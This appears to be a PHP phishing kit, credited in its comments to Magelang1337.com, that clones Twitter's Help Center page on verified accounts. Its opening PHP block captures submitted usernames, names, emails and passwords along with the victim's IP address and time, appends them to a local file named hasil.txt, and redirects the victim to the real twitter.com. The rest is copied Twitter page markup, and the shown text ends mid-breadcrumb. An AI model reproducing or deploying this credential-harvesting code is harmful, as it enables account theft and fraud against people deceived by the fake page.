<?php

//Phising Twitter 
//By Magelang1337.com
//Untuk tutorial Lainnya silahkan kunjungi www.magelang133.com

if($_POST){
	date_default_timezone_set('Asia/Jakarta');
	$username = $_POST["username"];
	$name = $_POST["name"];
	$mail = $_POST["mail"];
	$password = $_POST["password"];
	$ip = $_SERVER['REMOTE_ADDR'];  
	$cur_time=date("d-m-Y H:i:s");
	$file = fopen('hasil.txt', 'a'); 
	fwrite($file, "-----eMail : ".$mail." --|--".$username." : <---Username-password --> :  " .$password. "   Ip Address: " .$ip. "   Time: " .$cur_time.  "\n\n");
	fclose($file);
	header("Location:https://twitter.com");
}
?>
<html lang="en" prefix="og: http://ogp.me/ns#" data-behavior="i18n" class="fonts-loaded js-no-scroll fonts-loaded--helveticaNeueLt400 fonts-loaded--helveticaNeueLt700 fonts-loaded--helveticaNeueLt400Italic"><head>
    <meta charset="utf-8">

<meta name="viewport" content="width=device-width, initial-scale=1">
<base href="https://help.twitter.com/">
<title>About verified accounts</title>
<meta name="description" content="The blue verified badge on Twitter lets people know that an account of public interest is authentic. Learn about which types of accounts become verified.">
<link rel="canonical" href="https://help.twitter.com/en/managing-your-account/about-twitter-verified-accounts">



<meta property="og:url" content="https://help.twitter.com/en/managing-your-account/about-twitter-verified-accounts">
<meta property="og:type" content="article">
<meta property="og:title" content="About verified accounts">
<meta property="og:description" content="The blue verified badge on Twitter lets people know that an account of public interest is authentic. Learn about which types of accounts become verified.">
<meta property="og:image" content="https://help.twitter.com/content/dam/help-twitter/logos/card_small_green.png">
<meta name="keywords" content="twitter verified, verified accounts">


<meta name="twitter:card" content="summary">

      <link rel="alternate" hreflang="en" href="https://help.twitter.com/en/managing-your-account/about-twitter-verified-accounts">
      <link rel="alternate" hreflang="es" href="https://help.twitter.com/es/managing-your-account/about-twitter-verified-accounts">
      <link rel="alternate" hreflang="ja" href="https://help.twitter.com/ja/managing-your-account/about-twitter-verified-accounts">
      <link rel="alternate" hreflang="ko" href="https://help.twitter.com/ko/managing-your-account/about-twitter-verified-accounts">
      <link rel="alternate" hreflang="de" href="https://help.twitter.com/de/managing-your-account/about-twitter-verified-accounts">
      <link rel="alternate" hreflang="tr" href="https://help.twitter.com/tr/managing-your-account/about-twitter-verified-accounts">
      <link rel="alternate" hreflang="fr" href="https://help.twitter.com/fr/managing-your-account/about-twitter-verified-accounts">
      <link rel="alternate" hreflang="it" href="https://help.twitter.com/it/managing-your-account/about-twitter-verified-accounts">
      <link rel="alternate" hreflang="ar" href="https://help.twitter.com/ar/managing-your-account/about-twitter-verified-accounts">
      <link rel="alternate" hreflang="nl" href="https://help.twitter.com/nl/managing-your-account/about-twitter-verified-accounts">
      <link rel="alternate" hreflang="id" href="https://help.twitter.com/id/managing-your-account/about-twitter-verified-accounts">
      <link rel="alternate" hreflang="ru" href="https://help.twitter.com/ru/managing-your-account/about-twitter-verified-accounts">
      <link rel="alternate" hreflang="hi" href="https://help.twitter.com/hi/managing-your-account/about-twitter-verified-accounts">


<meta name="twitter:widgets:new-embed-design" content="on">
<meta name="twitter:widgets:csp" content="on">

<link href="https://abs.twimg.com/favicons/favicon.ico" rel="shortcut icon" type="image/x-icon">

<link rel="stylesheet" href="/etc/designs/help-twitter/public/css/main.css" media="all" type="text/css">

<link href="/etc/designs/help-twitter/public/css/print.css" rel="stylesheet" media="print">
</head>
  <body class="twtr-theme--green page article-page twtr-color-bg--extra-extra-light-gray-neutral js-no-scroll" data-analytics-page="help" data-analytics-section="managing-your-account" data-analytics-component="about-twitter-verified-accounts" data-analytics-element="page" data-iso-code="en" data-all-languages="en,es,ja,ko,de,tr,fr,it,ar,nl,id,ru,hi,">
      <header class="twtr-header  twtr-main  twtr-header--no-margin  twtr-color-bg--white-neutral">
  


<div class="u01 twtr-main is-full" data-short-header="true">
  <div class="u01__item  twtr-color-bg--green-extra-dark">
    

<div role="button" class="u01__menu-toggle  js-toggle-nav  is-collapsed  twtr-color--white-neutral" data-target=".u01__menu--site">
  <span class="u01__menu-toggle-text  visuallyhidden" data-open-message="Open menu" data-close-message="Close menu">Close menu</span>
  
  <div class="u01__menu-toggle-icon">
    <span class="u01__menu-toggle-icon-bar"></span>
    <span class="u01__menu-toggle-icon-bar"></span>
    <span class="u01__menu-toggle-icon-bar"></span>
    <span class="u01__menu-toggle-icon-bar"></span>
  </div>
</div>


<div class="u01__navbar  twtr-color-bg--green-extra-dark">
  <a href="https://help.twitter.com/en" class="u01__brand">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="u01__brand-icon twtr-icon--base  twtr-color-fill--white-neutral"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .364.042.718.12 1.06-3.873-.195-7.304-2.05-9.602-4.868-.4.69-.63 1.49-.63 2.342 0 1.616.823 3.043 2.072 3.878-.764-.025-1.482-.234-2.11-.583v.06c0 2.257 1.605 4.14 3.737 4.568-.392.106-.803.162-1.227.162-.3 0-.593-.028-.877-.082.593 1.85 2.313 3.198 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.093 7.14 2.093 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.477 2.323-2.41z"></path> 
</svg>
    <span class="u01__site-name  twtr-type--bold-16  twtr-color--white-neutral">Help Center</span>
  </a>
  <div class="u01__navbar-item twtr-color-bg--green-extra-dark" style="">
    <ul class="u01__menu  u01__menu--site">
      <li class="u01__menu-item  u01__menu-item-topics  has-dropdown  js-toggle-dropdown  twtr-color-border--green-light">
        <span class="u01__menu-item-title  twtr-type--bold-24  twtr-color--green-light">Help topics</span>
        <ul class="u01__dropdown">
          
            <li class="u01__dropdown-item  ">
              <a href="https://help.twitter.com/en/using-twitter" class="u01__dropdown-item-link has-hover twtr-type--bold-24 twtr-color--green-dark" data-link-color-sm="twtr-color--green-light" data-link-color-lg="twtr-color--green-dark">
                Using Twitter
              </a>
            </li>
          
            <li class="u01__dropdown-item  is-active">
              <a href="https://help.twitter.com/en/managing-your-account" class="u01__dropdown-item-link has-hover twtr-type--bold-24 twtr-color--green-dark" data-link-color-sm="twtr-color--green-light" data-link-color-lg="twtr-color--green-dark">
                Managing your account
              </a>
            </li>
          
            <li class="u01__dropdown-item  ">
              <a href="https://help.twitter.com/en/safety-and-security" class="u01__dropdown-item-link has-hover twtr-type--bold-24 twtr-color--green-dark" data-link-color-sm="twtr-color--green-light" data-link-color-lg="twtr-color--green-dark">
                Safety and security
              </a>
            </li>
          
            <li class="u01__dropdown-item  ">
              <a href="https://help.twitter.com/en/rules-and-policies" class="u01__dropdown-item-link has-hover twtr-type--bold-24 twtr-color--green-dark" data-link-color-sm="twtr-color--green-light" data-link-color-lg="twtr-color--green-dark">
                Rules and policies
              </a>
            </li>
          
        </ul>
      </li>
      <li class="u01__menu-item  u01__menu-item-guides  has-dropdown js-toggle-dropdown  twtr-color-border--green-light">
        <span class="u01__menu-item-title  twtr-type--bold-24  twtr-color--green-light">Guides</span>
        <ul class="u01__dropdown">
          
            <li class="u01__dropdown-item">
              <a href="https://help.twitter.com/en/twitter-guide" class="u01__dropdown-item-link has-hover twtr-type--bold-24 twtr-color--green-dark" data-link-color-sm="twtr-color--green-light" data-link-color-lg="twtr-color--green-dark">
                Getting Started
              </a>
            </li>
          
            <li class="u01__dropdown-item">
              <a href="https://help.twitter.com/en/new-user-faq" class="u01__dropdown-item-link has-hover twtr-type--bold-24 twtr-color--green-dark" data-link-color-sm="twtr-color--green-light" data-link-color-lg="twtr-color--green-dark">
                New user FAQ
              </a>
            </li>
          
            <li class="u01__dropdown-item">
              <a href="https://help.twitter.com/en/glossary" class="u01__dropdown-item-link has-hover twtr-type--bold-24 twtr-color--green-dark" data-link-color-sm="twtr-color--green-light" data-link-color-lg="twtr-color--green-dark">
                Glossary
              </a>
            </li>
          
        </ul></li>
      <li class="u01__menu-item  u01__menu-item-contact  u01__menu-btn"><a href="https://help.twitter.com/en/contact-us" class="u01__menu-item-title  twtr-type--bold-24 twtr-color--green-light  has-hover">Contact us</a></li>
    </ul>
    <ul class="u01__menu  u01__menu--user">
      <li class="u01__menu-item  u01__menu-item--search">
        <a class="twtr-color--white-neutral" href="https://help.twitter.com/en/search">
          <span class="u01__menu-item-search-text  twtr-type--bold-24  twtr-color--green-light  has-hover">Search</span>
          <div class="u01__icon-search">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="u01__menu-item-search-icon  twtr-color-fill--white-neutral"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M22.06 19.94l-3.73-3.73C19.38 14.737 20 12.942 20 11c0-4.97-4.03-9-9-9s-9 4.03-9 9 4.03 9 9 9c1.943 0 3.738-.622 5.21-1.67l3.73 3.73c.292.294.676.44 1.06.44s.768-.146 1.06-.44c.586-.585.586-1.535 0-2.12zM11 17c-3.308 0-6-2.692-6-6s2.692-6 6-6 6 2.692 6 6-2.692 6-6 6z"></path> 
</svg>
            <svg xmlns="http://www.w3.org/2000/svg" width="46" height="72" viewBox="0 0 46 72" class="u01__menu-item-search-close-icon  twtr-color-fill--white-neutral  twtr-icon--md  is-hidden">
 <path d="M27.243 36l14.879-14.879a2.998 2.998 0 0 0 0-4.242 2.998 2.998 0 0 0-4.242 0L23 31.758 8.122 16.879a2.998 2.998 0 0 0-4.242 0 2.998 2.998 0 0 0 0 4.242L18.758 36 3.879 50.879A2.998 2.998 0 0 0 6.001 56a2.99 2.99 0 0 0 2.121-.879L23 40.242l14.879 14.879A2.991 2.991 0 0 0 40 56a2.998 2.998 0 0 0 2.121-5.121L27.243 36z"></path>
</svg>
          </div>
        </a>
      </li>
      
<li>
  <ul class="u04">
    <li class="u04__menu-item  u04__menu-item--user  signed-out">

      <div class="u04__user-img  hidden   js-toggle-mobile-dropdown">
        <div class="u04__user-img-link  js-inject-profile-image">
          
        </div>
        <span class="u04__user-handle  twtr-type--roman-16  twtr-color--dark-gray-neutral">undefined</span>
        <div class="u04__user-close">
          <div class="u04__user-close-link">
            
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="u04__user-close  twtr-color-fill--dark-gray-neutral"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M20.207 14.543l-7.5-7.5c-.39-.39-1.023-.39-1.414 0l-7.5 7.5c-.39.39-.39 1.023 0 1.414.195.195.45.293.707.293s.512-.098.707-.293L12 9.164l6.793 6.793c.195.195.45.293.707.293s.512-.098.707-.293c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
          </div>
        </div>
      </div>
      <ul class="u04__dropdown  hidden" data-vit-form="https://support.twitter.com/forms/get_help_now">
        <li class="u04__dropdown-item">
          <a class="twtr-color--green-dark  has-hover  twtr-type--roman-14" href="https://twitter.com">Go to Twitter</a>
        </li>
        <li class="u04__dropdown-item">
          <a class="u04__dropdown-item-logout  twtr-color--green-dark  has-hover  twtr-type--roman-14" href="https://twitter.com/logout">Sign out</a>
        </li>
      </ul>
      <a class="u04__menu-item-title  twtr-type--bold-24  u04__menu-item-login" href="https://twitter.com/login?redirect_after_login=https://help.twitter.com/en/managing-your-account/about-twitter-verified-accounts" target="_blank" rel="noopener">
        Sign in
      </a>
    </li>
  </ul>
</li>

    </ul>
  </div>
</div>

    <!-- <sly data-sly-include="partial/u01-header.html" /> -->
    

<div class="u01__search-overlay  twtr-container  twtr-color-bg--green-extra-dark">
  <div class="u01__search-overlay-wrapper">
    <div class="u01__search-overlay-grid  twtr-grid">
      <div class="twtr-grid__col-24  twtr-grid--align-self-end">
        
        
  
  
  
  

  <form id="u01__search--overlay__form" class="u01__search-form" action="https://help.twitter.com/en/search" autocomplete="off">
    <div class="u01__search-role" role="search">
      <label for="u01__search--overlay" class="visuallyhidden">Search this site</label>
      
      <div class="u01__search-input-group  twtr-color--green-dark">
      
        <input name="q" id="u01__search--overlay" type="search" placeholder="Search" autocomplete="off" required="" class="u01__search-input  twtr-type--roman-24  js-u01-search-input-focus">
        
        <span class="u01__search-focus-indicator  twtr-color-bg--green-dark"></span>
        
        <button type="submit" class="u01__search-submit">
          <span aria-hidden="true"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="u01__search-submit-icon  twtr-icon--base  twtr-color-fill--green-dark  js-u01-search-submit"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M22.06 19.94l-3.73-3.73C19.38 14.737 20 12.942 20 11c0-4.97-4.03-9-9-9s-9 4.03-9 9 4.03 9 9 9c1.943 0 3.738-.622 5.21-1.67l3.73 3.73c.292.294.676.44 1.06.44s.768-.146 1.06-.44c.586-.585.586-1.535 0-2.12zM11 17c-3.308 0-6-2.692-6-6s2.692-6 6-6 6 2.692 6 6-2.692 6-6 6z"></path> 
</svg></span>
          <span class="visuallyhidden">Search</span>
        </button>
      </div><!--/u01__search-input-group-->
    </div><!--/u01__search-role-->
  </form><!--/u01__search-form-->

      </div>
    </div>
  </div>
</div>

  </div>
</div>
</header>

      


<main class="twtr-main">
  <div class="twtr-container">
    <div class="twtr-grid">
      <div class="twtr-grid__yin  twtr-grid__col-24  twtr-grid__col-md2-8">
        







<div class="c03  c0-nav twtr-color-bg--green-dark">
  <div class="c03__item  c0-nav__item">
    <div class="c0-nav__menu-mobile  twtr-color-bg--green-dark">
      <div class="c0-nav__menu-mobile-toggle  js-menu-mobile-toggle">
        <h5 class="c0-nav__menu-mobile-toggle-title">
          <span class="c0-nav__menu-mobile-toggle-text  twtr-type--roman-18  js-menu-mobile-title">
            
            Verified accounts
          </span>
          
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="c0-nav__menu-mobile-toggle-icon  twtr-icon--sm  twtr-color-fill--white-neutral"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M20.207 7.043c-.39-.39-1.023-.39-1.414 0L12 13.836 5.207 7.043c-.39-.39-1.023-.39-1.414 0s-.39 1.023 0 1.414l7.5 7.5c.195.195.45.293.707.293s.512-.098.707-.293l7.5-7.5c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
        </h5>
      </div>
      <div class="c0-nav__menu-mobile-search">
        <form class="c0-nav__menu-mobile-search-form  twtr-color-border--green-dark  is-visible" action="https://help.twitter.com/en/search.html">
          <button type="button" class="c0-nav__menu-mobile-search-submit  js-menu-search-open">
            <span class="c0-nav__menu-mobile-search-submit-text  visuallyhidden">Search</span>
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="c0-nav__menu-mobile-search-icon  twtr-icon  twtr-color-fill--white-neutral"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M22.06 19.94l-3.73-3.73C19.38 14.737 20 12.942 20 11c0-4.97-4.03-9-9-9s-9 4.03-9 9 4.03 9 9 9c1.943 0 3.738-.622 5.21-1.67l3.73 3.73c.292.294.676.44 1.06.44s.768-.146 1.06-.44c.586-.585.586-1.535 0-2.12zM11 17c-3.308 0-6-2.692-6-6s2.692-6 6-6 6 2.692 6 6-2.692 6-6 6z"></path> 
</svg>
          </button>
          <input class="c0-nav__menu-mobile-search-input  twtr-type--roman-16  twtr-color--white-neutral" type="text" name="q" placeholder="Search">
          <button type="button" class="c0-nav__menu-mobile-close-icon  js-menu-search-close">
            <svg xmlns="http://www.w3.org/2000/svg" width="46" height="72" viewBox="0 0 46 72" class="twtr-icon  twtr-color-fill--white-neutral">
 <path d="M27.243 36l14.879-14.879a2.998 2.998 0 0 0 0-4.242 2.998 2.998 0 0 0-4.242 0L23 31.758 8.122 16.879a2.998 2.998 0 0 0-4.242 0 2.998 2.998 0 0 0 0 4.242L18.758 36 3.879 50.879A2.998 2.998 0 0 0 6.001 56a2.99 2.99 0 0 0 2.121-.879L23 40.242l14.879 14.879A2.991 2.991 0 0 0 40 56a2.998 2.998 0 0 0 2.121-5.121L27.243 36z"></path>
</svg>
          </button>
        </form>
      </div>
    </div>
    <ul class="c0-nav__menu-main  js-menu-main  js-c07-avoid-overlap">
      
        
          <li class="c0-nav__menu-main-item  ">
            <a class="c0-nav__menu-main-link  js-menu-main-link  twtr-type--bold-24  twtr-color--white-neutral  has-hover" href="https://help.twitter.com/en/using-twitter">
              Using Twitter
              
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="c0-nav__menu-main-icon  twtr-icon--sm  twtr-color-fill--light-gray-neutral"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M20.207 7.043c-.39-.39-1.023-.39-1.414 0L12 13.836 5.207 7.043c-.39-.39-1.023-.39-1.414 0s-.39 1.023 0 1.414l7.5 7.5c.195.195.45.293.707.293s.512-.098.707-.293l7.5-7.5c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
            </a>
            
            
            
            <ul class="c0-nav__menu-sub">
              
              <li class="c0-nav__menu-sub-item" data-hash-name="tweets" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                <span class="c0-nav__menu-border  twtr-color-bg--blue-light"></span>
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/using-twitter#tweets">
                    Tweets
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="adding-content-to-your-tweet" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/using-twitter#adding-content-to-your-tweet">
                    Adding content to your Tweet
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="search-and-trends" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/using-twitter#search-and-trends">
                    Search and trends
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="following-people-and-groups" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/using-twitter#following-people-and-groups">
                    Following and unfollowing
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="blocking-and-muting" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/using-twitter#blocking-and-muting">
                    Blocking and muting
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="direct-messages" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/using-twitter#direct-messages">
                    Direct Messages
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="twitter-on-your-device" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/using-twitter#twitter-on-your-device">
                    Twitter on your device
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="website-and-app-integrations" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/using-twitter#website-and-app-integrations">
                    Website and app integrations
                </a>
              </li>
            </ul>
          </li>
               
      
        
          <li class="c0-nav__menu-main-item  is-active">
            <a class="c0-nav__menu-main-link  js-menu-main-link  twtr-type--bold-24  twtr-color--white-neutral  has-hover" href="https://help.twitter.com/en/managing-your-account">
              Managing your account
              
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="c0-nav__menu-main-icon  twtr-icon--sm  twtr-color-fill--light-gray-neutral"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M20.207 7.043c-.39-.39-1.023-.39-1.414 0L12 13.836 5.207 7.043c-.39-.39-1.023-.39-1.414 0s-.39 1.023 0 1.414l7.5 7.5c.195.195.45.293.707.293s.512-.098.707-.293l7.5-7.5c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
            </a>
            
            
            
            <ul class="c0-nav__menu-sub">
              
              <li class="c0-nav__menu-sub-item" data-hash-name="login-and-password" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                <span class="c0-nav__menu-border  twtr-color-bg--green-dark"></span>
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/managing-your-account#login-and-password">
                    Login and password
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="username-email-and-phone" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/managing-your-account#username-email-and-phone">
                    Username, email, and phone
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="account-settings" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/managing-your-account#account-settings">
                    Account settings
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="notifications" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/managing-your-account#notifications">
                    Notifications
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="verified-accounts" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/managing-your-account#verified-accounts">
                    Verified accounts
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="suspended-accounts" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/managing-your-account#suspended-accounts">
                    Suspended accounts
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="deactivate-and-reactivate-accounts" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/managing-your-account#deactivate-and-reactivate-accounts">
                    Deactivate and reactivate accounts
                </a>
              </li>
            </ul>
          </li>
        
        
      
        
          <li class="c0-nav__menu-main-item  ">
            <a class="c0-nav__menu-main-link  js-menu-main-link  twtr-type--bold-24  twtr-color--white-neutral  has-hover" href="https://help.twitter.com/en/safety-and-security">
              Safety and security
              
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="c0-nav__menu-main-icon  twtr-icon--sm  twtr-color-fill--light-gray-neutral"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M20.207 7.043c-.39-.39-1.023-.39-1.414 0L12 13.836 5.207 7.043c-.39-.39-1.023-.39-1.414 0s-.39 1.023 0 1.414l7.5 7.5c.195.195.45.293.707.293s.512-.098.707-.293l7.5-7.5c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
            </a>
            
            
            
            <ul class="c0-nav__menu-sub">
              
              <li class="c0-nav__menu-sub-item" data-hash-name="hacked-account" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                <span class="c0-nav__menu-border  twtr-color-bg--pink-dark"></span>
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/safety-and-security#hacked-account">
                    Security and hacked accounts
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="ads-and-data-privacy" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/safety-and-security#ads-and-data-privacy">
                    Privacy
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="spam-and-fake-accounts" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/safety-and-security#spam-and-fake-accounts">
                    Spam and fake accounts
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="sensitive-content" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/safety-and-security#sensitive-content">
                    Sensitive content
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="abuse" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/safety-and-security#abuse">
                    Abuse
                </a>
              </li>
            </ul>
          </li>
        
        
      
        
          <li class="c0-nav__menu-main-item  ">
            <a class="c0-nav__menu-main-link  js-menu-main-link  twtr-type--bold-24  twtr-color--white-neutral  has-hover" href="https://help.twitter.com/en/rules-and-policies">
              Rules and policies
              
              <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="c0-nav__menu-main-icon  twtr-icon--sm  twtr-color-fill--light-gray-neutral"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M20.207 7.043c-.39-.39-1.023-.39-1.414 0L12 13.836 5.207 7.043c-.39-.39-1.023-.39-1.414 0s-.39 1.023 0 1.414l7.5 7.5c.195.195.45.293.707.293s.512-.098.707-.293l7.5-7.5c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
            </a>
            
            
            
            <ul class="c0-nav__menu-sub">
              
              <li class="c0-nav__menu-sub-item" data-hash-name="twitter-rules" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                <span class="c0-nav__menu-border  twtr-color-bg--orange-light"></span>
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/rules-and-policies#twitter-rules">
                    Twitter Rules and policies
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="general-policies" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/rules-and-policies#general-policies">
                    General guidelines and policies
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="law-enforcement-guildelines" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/rules-and-policies#law-enforcement-guildelines">
                    Law enforcement guidelines
                </a>
              </li>
            
              
              <li class="c0-nav__menu-sub-item" data-hash-name="research-and-experiments" data-active-class-name="is-active" data-active-sm-color="twtr-color--green-light" data-active-lg-color="twtr-color--green-dark">
                
                <a class="twtr-type--roman-16  c0-nav__menu-sub-item-title" href="https://help.twitter.com/en/rules-and-policies#research-and-experiments">
                    Research and experiments
                </a>
              </li>
            </ul>
          </li>
        
        
      
    </ul>
  </div>
</div>

      </div>
      <div class="twtr-grid__yang  twtr-grid__yang--article  twtr-grid__col-24  twtr-grid__col-md2-14  twtr-grid__col-lg-12  twtr-grid__col-xlg-10  twtr-component-space--md">
        <div class="twtr-component-space--md">
          <div class="ap01-breadcrumb  twtr-component-space--md  twtr-hidden--xs  twtr-hidden--sm">
  <div class="ap01">
    <div class="ap01__item">
      <ul class="ap01__menu">
        <li class="ap01__menu-item">
          
          <a class="js-track--click  twtr-type--bold-12  twtr-color--blue-light" data-event-category="breadcrumb" data-event-label="Help Center" href="https://help.twitter.com/en">Help Center</a>
          
        </li>
      
        
      
        <li class="ap01__menu-item">
          
            
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="ap01__arrow-icon  twtr-icon--sm  twtr-color-fill--extra-light-gray-neutral"> 
 <path opacity="0" d="M0 0h24v24H0z"></path> 
 <path d="M17.207 11.293l-7.5-7.5c-.39-.39-1.023-.39-1.414 0s-.39 1.023 0 1.414L15.086 12l-6.793 6.793c-.39.39-.39 1.023 0 1.414.195.195.45.293.707.293s.512-.098.707-.293l7.5-7.5c.39-.39.39-1.023 0-1.414z"></path> 
</svg>
          
          <a class="js-track--click  twtr-type--bold-12  twtr-color--blue-light" data-event-category="breadcrumb" data-event-label="Verified accounts" href="https://help.twitter.com/en/managing-your-account#verified-accounts">Verified accounts</a>
          
        </li>
      
